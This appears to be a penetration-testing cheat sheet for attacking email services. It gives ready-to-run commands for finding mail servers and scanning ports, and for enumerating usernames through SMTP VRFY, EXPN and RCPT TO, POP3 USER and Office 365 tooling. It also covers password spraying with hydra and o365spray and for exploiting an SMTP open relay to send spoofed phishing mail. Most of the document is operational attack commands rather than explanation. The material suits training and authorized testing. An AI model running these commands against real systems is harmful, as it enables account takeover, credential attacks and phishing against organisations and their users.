## Mail Service Identification

**When to use** Starting enumeration for a target domain to determine if email is cloud-hosted or managed via a custom on-premise server.

**Commands** Query MX records to find the mail handling server for a domain.

```
host -t MX <DOMAIN>
```

Use dig for more verbose MX record output.

```
dig mx <DOMAIN> | grep "MX" | grep -v ";"
```

Resolve the mail server hostname to an IP address.

```
host -t A <SERVICE_NAME>
```

**Tool comparison**

- **host** -> `host -t MX <DOMAIN>` -> use for quick identification of the primary mail handler.
- **dig** -> `dig mx <DOMAIN>` -> use when detailed record information or manual filtering is required.

**Gotchas** **Cloud providers** (G-Suite, O365, Zoho) implement custom authentication that requires specific attack vectors compared to standard protocol implementations.

---

## Port Enumeration

**When to use** A custom mail server IP has been identified and requires service discovery for standard protocols.

**Commands** Scan for common encrypted and unencrypted mail service ports.

```
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
```

**Dangerous / misconfigured settings**

- Unencrypted ports (25, 110, 143) exposed to the network.
- Default nmap scripts identifying **VRFY** or **ETRN** support.

---

## Username Enumeration (SMTP)

**When to use** The SMTP service on port 25 is accessible and supports commands like **VRFY**, **EXPN**, or **RCPT TO**.

**Commands** Manually verify a specific user exists using the **VRFY** command.

```
telnet <TARGET_IP> 25
VRFY <USERNAME>
```

Expand a distribution list to identify all members using **EXPN**.

```
telnet <TARGET_IP> 25
EXPN <USERNAME>
```

Enumerate users via the recipient verification process.

```
telnet <TARGET_IP> 25
MAIL FROM:test@<DOMAIN>
RCPT TO:<USERNAME>
```

Automate the discovery process using a wordlist.

```
smtp-user-enum -M RCPT -U <FILE_PATH> -D <DOMAIN> -t <TARGET_IP>
```

**Edge cases**

- **VRFY** might be disabled while **RCPT TO** remains functional for enumeration.

**Gotchas** **Disabled features** like **VRFY** or **EXPN** will prevent manual enumeration; switch to **RCPT TO** or automated tools.

---

## Username Enumeration (POP3)

**When to use** POP3 is active on port 110 and the server implementation reveals account status during the login handshake.

**Commands** Probe for valid usernames using the **USER** command via telnet.

```
telnet <TARGET_IP> 110
USER <USERNAME>
```

**Gotchas** **Protocol behavior** varies by implementation; if the server does not respond with **+OK** or **-ERR** specifically for the **USER** command, this technique fails.

---

## Cloud Enumeration (Office 365)

**When to use** MX records confirm the domain uses **microsoft-com.mail.protection.outlook.com**.

**Commands** Confirm the target domain is actually utilizing Office 365.

```
python3 o365spray.py --validate --domain <DOMAIN>
```

Identify valid cloud usernames using a provided wordlist.

```
python3 o365spray.py --enum -U <FILE_PATH> --domain <DOMAIN>
```

**Gotchas** **Service changes** by cloud providers often break these tools; ensure they are updated to match current authentication implementations.

---

## Password Attacks

**When to use** A list of valid usernames has been collected and a password spray or brute force is required against standard protocols or cloud portals.

**Commands** Password spray a single password against a list of users over POP3.

```
hydra -L <FILE_PATH> -p '<PASSWORD>' -f <TARGET_IP> pop3
```

Execute a password spray against Office 365 with lockout protection.

```
python3 o365spray.py --spray -U <FILE_PATH> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
```

**Tool comparison**

- **Hydra** -> `hydra -L <FILE_PATH> -p <PASSWORD> <TARGET_IP> <SERVICE_NAME>` -> prefer for standard SMTP, POP3, and IMAP.
- **o365spray** -> `python3 o365spray.py --spray ...` -> prefer for Microsoft cloud environments to bypass standard protocol blocks.

**Gotchas** **Cracking protection** is commonly implemented; use small wordlists first to avoid lockouts or IP bans.

---

## SMTP Open Relay Exploitation

**When to use** Nmap confirms the SMTP server is improperly configured to allow unauthenticated email relaying.

**Commands** Verify if the SMTP port allows open relaying.

```
nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
```

Exploit an open relay to send a spoofed phishing email.

```
swaks --from <USERNAME>@<DOMAIN> --to <USERNAME>@<DOMAIN> --header 'Subject: <SERVICE_NAME>' --body '<FILE_PATH>' --server <TARGET_IP>
```

**Dangerous / misconfigured settings**

- SMTP servers configured to allow mail from any source to be re-routed.
- Lack of **Authentication** requirements for relaying messages.

**Gotchas** **Source masking** makes the email appear as if it originated from the open relay server itself, increasing the success of phishing.